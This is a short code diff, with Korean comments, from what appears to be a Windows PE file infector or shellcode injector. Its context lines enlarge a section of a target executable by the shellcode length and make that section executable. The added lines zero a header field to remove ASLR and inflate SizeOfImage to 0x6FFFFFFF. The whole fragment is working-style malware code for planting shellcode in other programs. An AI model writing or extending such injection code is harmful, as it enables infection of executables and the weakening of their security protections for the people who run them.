@@ -116,6 +116,8 @@ int APIENTRY wWinMain(
 		WriteDWORD(&target, EXTENDED_SECTION_HEADER + 8, RawDataSize + shell_len); // Virtual Size
 		temp = ReadDWORD(&target, EXTENDED_SECTION_HEADER + 0x24); // Characteristics
 		WriteDWORD(&target, EXTENDED_SECTION_HEADER + 0x24, temp ^ 0x20000000); // Characteristics에 EXECUTE권한 추가
+		WriteDWORD(&target, NT_HEADER + 0xA0, 0); // ASLR 제거
+		WriteDWORD(&target, NT_HEADER + 0x50, 0x6FFFFFFF); // Size Of Image 확장
 
 		DWORD EXTENDED_SECTION = ReadDWORD(&target, EXTENDED_SECTION_HEADER + 0x14);
 
